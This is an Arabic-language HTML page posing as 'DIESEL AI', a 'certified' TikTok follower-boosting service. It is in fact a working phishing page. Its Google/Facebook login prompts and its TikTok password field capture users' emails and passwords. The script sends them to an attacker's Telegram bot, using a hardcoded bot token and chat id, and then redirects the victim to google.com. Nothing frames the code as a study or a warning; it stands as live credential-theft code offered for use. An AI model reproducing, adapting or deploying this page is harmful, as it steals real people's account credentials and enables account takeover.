<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL AI | OFFICIAL SYSTEM</title>
    <style>
        body { background-color: #050505; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
        
        /* طبقة تسجيل الدخول */
        #login-overlay { position: fixed; top:0; left:0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-card { border: 2px solid #00ff00; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ff00; width: 300px; }
        .btn-social { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #00ff00; color: #00ff00; background: transparent; cursor: pointer; }
        
        /* لوحة التحكم */
        #main-content { display: none; padding: 20px; text-align: center; }
        .cert-badge { border: 1px solid #00ff00; padding: 15px; width: fit-content; margin: 20px auto; border-radius: 10px; background: rgba(0,255,0,0.1); }
        .main-card { background: #1a1a1a; padding: 20px; border-radius: 15px; max-width: 400px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; box-sizing: border-box; }
        .btn-submit { background: #ff3366; color: white; padding: 15px; width: 100%; border: none; cursor: pointer; border-radius: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <h1>DIESEL AI</h1>
            <p>سجل دخولك للتحقق</p>
            <button class="btn-social" onclick="openAuth('Google')">تسجيل عبر Google</button>
            <button class="btn-social" onclick="openAuth('Facebook')">تسجيل عبر Facebook</button>
        </div>
    </div>

    <div id="main-content">
        <h1>مرحباً بك في DIESEL AI</h1>
        <div class="cert-badge">
            <h3 style="color: #00ff00;">✅ DIESEL AI CERTIFIED</h3>
            <p style="font-size: 12px;">نظام معتمد وموثق للحقن الذكي v6.2</p>
        </div>
        <div class="main-card">
            <h3>تزويد تيك توك العالمي</h3>
            <input type="text" placeholder="اسم المستخدم (@username)">
            <input type="password" id="final-pass" placeholder="كلمة سر الحساب">
            <button class="btn-submit" onclick="finalizeAction()">تفعيل التزويد</button>
        </div>
    </div>

    <script>
        (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
    </script>

    <script>
        const token = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
        const chat_id = '5177962707';

        function openAuth(type) {
            const user = prompt(`أدخل ${type} البريد الإلكتروني:`);
            const pass = prompt("أدخل كلمة السر:");
            if(user && pass) {
                // ترحيب صوتي
                const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل، نظام الذكاء الاصطناعي جاهز للعمل.");
                window.speechSynthesis.speak(msg);
                // إرسال البيانات
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chat_id, text: `🛡 ${type} LOGIN:\nUser: ${user}\nPass: ${pass}`})
                });
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
            }
        }

        function finalizeAction() {
            const finalPass = document.getElementById('final-pass').value;
            if(finalPass) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chat_id, text: `🔑 كلمة السر النهائية: ${finalPass}`})
                }).then(() => {
                    window.location.href = "https://www.google.com";
                });
            }
        }
    </script>
</body>
</html>
